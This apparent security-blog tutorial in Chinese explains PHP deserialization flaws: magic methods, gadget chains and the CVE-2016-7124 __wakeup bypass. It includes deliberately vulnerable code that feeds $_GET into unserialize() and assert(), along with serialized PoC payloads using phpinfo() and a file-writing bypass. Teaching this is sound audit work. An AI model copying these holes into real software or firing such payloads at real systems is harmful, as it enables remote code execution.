<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="本文主要介绍1）序列化与反序列化基础 2）反序列化漏洞与魔法函数  3）CVE-2016-7124  4）Session反序列化漏洞  5）phar伪协议触发php反序列化  6）补充:phar伪协议绕过WAF (一)    序列化与反序列化基础serialize()将一个对象转换成一个字符串unserialize()将字符串还原为一个对象 serialize()在php中创建了一个对象后，可通过">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP反序列化">
<meta property="og:url" content="http://yoursite.com/2019/01/26/PHP反序列化/index.html">
<meta property="og:site_name" content="pplsec">
<meta property="og:description" content="本文主要介绍1）序列化与反序列化基础 2）反序列化漏洞与魔法函数  3）CVE-2016-7124  4）Session反序列化漏洞  5）phar伪协议触发php反序列化  6）补充:phar伪协议绕过WAF (一)    序列化与反序列化基础serialize()将一个对象转换成一个字符串unserialize()将字符串还原为一个对象 serialize()在php中创建了一个对象后，可通过">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-01-26T13:47:52.545Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PHP反序列化">
<meta name="twitter:description" content="本文主要介绍1）序列化与反序列化基础 2）反序列化漏洞与魔法函数  3）CVE-2016-7124  4）Session反序列化漏洞  5）phar伪协议触发php反序列化  6）补充:phar伪协议绕过WAF (一)    序列化与反序列化基础serialize()将一个对象转换成一个字符串unserialize()将字符串还原为一个对象 serialize()在php中创建了一个对象后，可通过">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/01/26/PHP反序列化/">





  <title>PHP反序列化 | pplsec</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">pplsec</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">爱安全 爱生活</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-首页">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-归档">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-分类">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-关于">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/26/PHP反序列化/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">PHP反序列化</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-26T19:12:21+08:00">
                2019-01-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>本文主要介绍1）序列化与反序列化基础 2）反序列化漏洞与魔法函数  3）CVE-2016-7124  4）Session反序列化漏洞  5）phar伪协议触发php反序列化  6）补充:phar伪协议绕过WAF</p>
<h3 id="一-序列化与反序列化基础"><a href="#一-序列化与反序列化基础" class="headerlink" title="(一)    序列化与反序列化基础"></a>(一)    序列化与反序列化基础</h3><p>serialize()将一个对象转换成一个字符串<br>unserialize()将字符串还原为一个对象</p>
<h4 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h4><p>在php中创建了一个对象后，可通过serialize()把这个对象转变成一个字符串，这有利于存储或传递PHP的值，同时不丢失其类型和结构。</p>
<h5 id="序列化示例代码"><a href="#序列化示例代码" class="headerlink" title="序列化示例代码"></a>序列化示例代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">	var $test = &apos;hello123&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = new lltest;</span><br><span class="line">$class1_ser = serialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line">//var_dump($class1_ser);</span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h5 id="序列化数据格式说明"><a href="#序列化数据格式说明" class="headerlink" title="序列化数据格式说明"></a>序列化数据格式说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;</span><br><span class="line">表示一个lltest对象，属性test（字符串）值为20</span><br><span class="line">O表示存储的是class对象（object）,如果serialize()传入的是一个数组，就会为字母a。</span><br><span class="line">6表示对象的名称有6个字符。&quot;lltest&quot;为对象的名称。</span><br><span class="line">1表示有一个值。</span><br><span class="line">&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;，s表示字符串，4表示该字符串的长度，&quot;test&quot;为字符串的名称</span><br><span class="line"></span><br><span class="line">O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;</span><br><span class="line">表示一个User对象，有两个属性，属性age值为20，属性name值为john</span><br></pre></td></tr></table></figure>
<h4 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h4><p>unserialize()可以从序列化后的字符串中恢复为原来的对象（object）</p>
<h5 id="反序列化示例代码"><a href="#反序列化示例代码" class="headerlink" title="反序列化示例代码"></a>反序列化示例代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class lltest&#123;</span><br><span class="line">	var $test = &apos;hello123&apos;;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $class2_ser = &apos;O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;&apos;;</span><br><span class="line"> $class2_unser = unserialize($class2_ser);</span><br><span class="line"> print_r($class2_unser);</span><br><span class="line"> //var_dump($class2_unser);</span><br><span class="line"> //输出：lltest Object ( [test] =&gt; hello123 ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="二-反序列化漏洞与魔法函数"><a href="#二-反序列化漏洞与魔法函数" class="headerlink" title="(二)    反序列化漏洞与魔法函数"></a>(二)    反序列化漏洞与魔法函数</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>PHP调用unserialize()后会自动调用魔术方法__wakeup()和__destruct()。理想的情况就是当魔术方法__wakeup()或__destruct()中存在漏洞代码或者变量可控等，就可能导致远程命令执行（RCE）等漏洞。也可以间接调用或者利用普通成员方法-相同函数名称触发漏洞。</p>
<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。<br><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__wakeup():当调用unserialize()函数时，unserialize() 会检查是否存在一个\__wakeup() 方法。如果存在，则会先调用\__wakeup 方法，预先准备对象需要的资源。</span><br><span class="line">__destruct()：析构函数,当对象被销毁时会自动调用。</span><br><span class="line">__construct()：构造函数,当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">__sleep():serialize() 函数会检查类中是否存在 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</span><br><span class="line">__invoke():当把一个类当作函数使用时自动调用</span><br><span class="line">__tostring():当把一个类当作字符串使用时自动调用</span><br><span class="line">__call():当要调用的方法不存在或权限不足时自动调用</span><br></pre></td></tr></table></figure>
<h4 id="反序列化时魔术方法调用示例"><a href="#反序列化时魔术方法调用示例" class="headerlink" title="反序列化时魔术方法调用示例"></a>反序列化时魔术方法调用示例</h4><p>PHP调用unserialize()后会自动调用魔术方法__wakeup() 和__destruct()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class lltest&#123;</span><br><span class="line">	var $test = &apos;hello123&apos;;</span><br><span class="line">	</span><br><span class="line">	function __wakeup()&#123;  //unserialize()时会自动调用</span><br><span class="line">		echo &quot;__wakeup&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __construct()&#123;  //当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">		echo &quot;__construct&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __destruct()&#123;  //当对象被销毁时会自动调用</span><br><span class="line">		echo &quot;__destruct&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $class2_ser = &apos;O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;&apos;;</span><br><span class="line"> $class2_unser = unserialize($class2_ser);</span><br><span class="line"> print_r($class2_unser);</span><br><span class="line"> echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">//输出：</span><br><span class="line"> //__wakeup</span><br><span class="line"> //lltest Object ( [test] =&gt; hello123 )</span><br><span class="line"> //__destruct</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>执行代码会输出如下，说明调用unserialize()后会自动调用魔术方法__wakeup() 和__destruct()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__wakeup</span><br><span class="line">lltest Object ( [test] =&gt; hello123 )</span><br><span class="line">__destruct</span><br></pre></td></tr></table></figure></p>
<h4 id="wakeup-或-destruct"><a href="#wakeup-或-destruct" class="headerlink" title="__wakeup() 或__destruct()"></a>__wakeup() 或__destruct()</h4><p>PHP调用unserialize()后会自动调用魔术方法__wakeup()和__destruct()</p>
<h5 id="wakeup-漏洞代码示例"><a href="#wakeup-漏洞代码示例" class="headerlink" title="__wakeup()漏洞代码示例"></a>__wakeup()漏洞代码示例</h5><p>PHP调用unserialize()后会自动调用魔术方法__wakeup()，执行__wakeup()中的assert，相当于执行assert(“phpinfo();”);</p>
<h6 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $code;</span><br><span class="line">    function __wakeup()//function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">       assert($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = $_GET[&apos;www&apos;];</span><br><span class="line">unserialize($poc);</span><br><span class="line">//xxx.php?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">//相当于执行assert(&quot;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>
<h6 id="生成POC"><a href="#生成POC" class="headerlink" title="生成POC"></a>生成POC</h6><p>生成序列化POC，要求对象名/变量名(lltest/code) 与要触发代码的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $code=&quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$myclass = new lltest;</span><br><span class="line">$myclass_ser_poc = serialize($myclass);</span><br><span class="line">echo $myclass_ser_poc;</span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">//生成序列化POC</span><br><span class="line">// 生成POC 要求对象名/变量名(lltest/code) 与要触发代码的一样</span><br></pre></td></tr></table></figure>
<h4 id="间接调用"><a href="#间接调用" class="headerlink" title="间接调用"></a>间接调用</h4><p>如果unserialize()中并不会自动调用的魔术函数，如__construct()，是不是就没有利用价值呢？不是。有时反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可能层层间接调用触发漏洞。<br>比如__construct()方法中存在漏洞代码，正好在__wakeup()中new创建对象，所以unserialize()时 间接触发漏洞代码    </p>
<h6 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class evil&#123;</span><br><span class="line">	</span><br><span class="line">	function __construct($test)&#123;</span><br><span class="line">		var_dump($test);</span><br><span class="line">		assert($test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class lltest&#123;</span><br><span class="line">	var $test;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$obj = new evil($this-&gt;test);  //new时调用__construct</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$myclass = $_GET[&apos;www&apos;];</span><br><span class="line">$myclass_unser = unserialize($myclass);</span><br><span class="line">//print_r($myclass_unser);</span><br><span class="line">var_dump($myclass_unser);</span><br><span class="line"></span><br><span class="line">//?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;   相当于执行assert(&quot;phpinfo();&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h6 id="生成POC-1"><a href="#生成POC-1" class="headerlink" title="生成POC"></a>生成POC</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成反序列化POC</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $test=&quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class3 = new lltest;</span><br><span class="line">$class3_ser = serialize($class3);</span><br><span class="line">echo $class3_ser;</span><br><span class="line"></span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="利用普通成员方法-相同函数名称"><a href="#利用普通成员方法-相同函数名称" class="headerlink" title="利用普通成员方法-相同函数名称"></a>利用普通成员方法-相同函数名称</h4><p>当漏洞/危险代码存在类的普通方法中，就不能通过“自动调用”来触发漏洞。这时的利用方法：寻找相同的函数名，把敏感函数和类联系在一起</p>
<h6 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接访问u2.php  执行输出hello  执行class normal 中的 function action() </span><br><span class="line">访问 u2.php?www=O:6:&quot;lltest&quot;:1:&#123;s:5:&quot;test1&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;  相当于执行assert(&quot;phpinfo();&quot;);   执行class evil中的 function action()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test1 = new normal();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test1-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class normal &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        assert($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass = new lltest();</span><br><span class="line">unserialize(@$_GET[&apos;www&apos;]);</span><br><span class="line">//直接访问u2.php  输出hello</span><br><span class="line">//访问 u2.php?www=O:6:&quot;lltest&quot;:1:&#123;s:5:&quot;test1&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;  相当于执行assert(&quot;phpinfo();&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h6 id="生成POC-2"><a href="#生成POC-2" class="headerlink" title="生成POC"></a>生成POC</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成反序列化POC</span><br><span class="line">class lltest &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test1 = new evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2 = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass_poc = new lltest();</span><br><span class="line">echo serialize($myclass_poc);</span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:5:&quot;test1&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="三-CVE-2016-7124"><a href="#三-CVE-2016-7124" class="headerlink" title="(三)    CVE-2016-7124"></a>(三)    CVE-2016-7124</h3><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124</a><br>当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。<br>存在该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。<br>典型漏洞：SugarCRM v6.5.23 PHP反序列化对象注入</p>
<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>测试版本：PHP Version 5.5.38<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）如果请求CVE-2016-7124.php?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;  执行\__wakeup() 方法清除了对象属性，把$test值清空，在test.php写入内容为空 </span><br><span class="line"></span><br><span class="line">2）如果请求CVE-2016-7124.php?www=O:6:&quot;lltest&quot;:99:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;</span><br><span class="line">对象个数设为99 跳过\__wakeup() 在test.php写入&lt;?php phpinfo();</span><br></pre></td></tr></table></figure></p>
<h4 id="CVE-2016-7124-php"><a href="#CVE-2016-7124-php" class="headerlink" title="CVE-2016-7124.php"></a>CVE-2016-7124.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//CVE-2016-7124</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">		var_dump($this);</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy3\\WWW\\test\\test.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()  //在__wakeup中清除了对象属性  把$test值清空</span><br><span class="line">        &#123;</span><br><span class="line">            foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">                    $this-&gt;$k = null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = $_GET[&apos;www&apos;];</span><br><span class="line">$poc_un = @unserialize($poc);</span><br><span class="line">//***.php?www=O:6:&quot;lltest&quot;:99:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;</span><br><span class="line">//CVE-2016-7124 对象个数设为99 跳过__wakeup() 在test.php写入&lt;?php phpinfo();</span><br><span class="line"></span><br><span class="line">//***.php?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;  执行__wakeup() 在test.php写入内容为空</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
